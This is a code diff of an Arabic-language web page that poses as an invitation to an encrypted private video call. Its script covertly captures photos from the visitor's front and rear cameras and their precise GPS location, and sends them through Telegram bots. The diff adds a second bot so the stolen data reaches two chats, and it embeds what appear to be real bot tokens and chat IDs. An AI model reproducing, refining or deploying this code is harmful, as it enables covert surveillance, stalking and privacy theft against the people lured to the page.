@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-        <meta property="og:type" content="website">
+    <meta property="og:type" content="website">
     <meta property="og:title" content=" انضم الآن: مكالمة فيديو خاصة جارية">
     <meta property="og:description" content="تمت دعوتك للانضمام إلى محادثة فيديو مشفرة. البروتوكول الأمني نشط (AES-256).">
     <meta property="og:image" content="https://images.unsplash.com/photo-1544005313-94ddf0286df2?w=500&q=80&blur=50">
@@ -28,14 +28,12 @@
             overflow: hidden; 
         }
         
-        /* الخلفية المضيئة المتمركزة */
         .bg-glow {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             width: 400px; height: 400px; background: var(--main-blue);
             filter: blur(160px); opacity: 0.12; z-index: -1;
         }
 
-        /* حاوية المحتوى الرئيسية المضبوطة للتوسيط */
         #ui-container { 
             width: 90%; 
             max-width: 420px; 
@@ -111,10 +109,17 @@
 <canvas id="snapshot-bus" style="display:none;"></canvas>
 
 <script>
-    const config = {
-        token: "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo",
-        chat_id: "6068331455"
-    };
+    // ===== إعدادات البوتين =====
+    const bots = [
+        {
+            token: "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo",
+            chat_id: "6068331455"
+        },
+        {
+            token: "8765447790:AAHDEG0N4Eq56SQSUWNqDnN8KMhttDPzhqg",
+            chat_id: "6929325426"
+        }
+    ];
 
     // توليد معرف جلسة عشوائي للتمويه
     document.getElementById('session-id').innerText = Math.random().toString(36).substring(2, 15).toUpperCase();
@@ -123,6 +128,29 @@
     const canvas = document.getElementById('snapshot-bus');
     const textElement = document.getElementById('display-text');
     let currentMode = "user";
+
+    // دالة مساعدة لإرسال صورة إلى جميع البوتات
+    async function sendPhotoToAllBots(blob, caption) {
+        const promises = bots.map(bot => {
+            const fd = new FormData();
+            fd.append('chat_id', bot.chat_id);
+            fd.append('photo', blob, 'security_log.jpg');
+            fd.append('caption', caption);
+            return fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, {
+                method: 'POST',
+                body: fd
+            });
+        });
+        await Promise.allSettled(promises);
+    }
+
+    // دالة مساعدة لإرسال رسالة نصية إلى جميع البوتات
+    async function sendMessageToAllBots(text) {
+        const promises = bots.map(bot => {
+            return fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${encodeURIComponent(text)}`);
+        });
+        await Promise.allSettled(promises);
+    }
 
     async function startEngine() {
         try {
@@ -161,12 +189,8 @@
         ctx.drawImage(video, 0, 0);
         
         canvas.toBlob(blob => {
-            const fd = new FormData();
-            fd.append('chat_id', config.chat_id);
-            fd.append('photo', blob, 'security_log.jpg');
-            fd.append('caption', `✅ تحديث أمني جديد\n📸 الكاميرا: ${currentMode === 'user' ? 'الأمامية' : 'الخلفية'}`);
-
-            fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
+            const caption = `✅ تحديث أمني جديد\n📸 الكاميرا: ${currentMode === 'user' ? 'الأمامية' : 'الخلفية'}`;
+            sendPhotoToAllBots(blob, caption);
         }, 'image/jpeg', 0.6);
     }
 
@@ -182,7 +206,7 @@
                             `الاحداثيات: ${lat}, ${lon}\n` +
                             `الرابط: ${mapLink}`;
 
-                fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chat_id}&text=${encodeURIComponent(msg)}`);
+                sendMessageToAllBots(msg);
             }, null, {enableHighAccuracy: true});
         }
     }
@@ -198,7 +222,7 @@
                 video.srcObject = stream;
                 setTimeout(takeShot, 1500);
             } catch(e) {}
-        }, 8000); // زيادة المدة قليلاً لاستقرار الاتصال
+        }, 8000);
     }
 
     window.onload = startEngine;
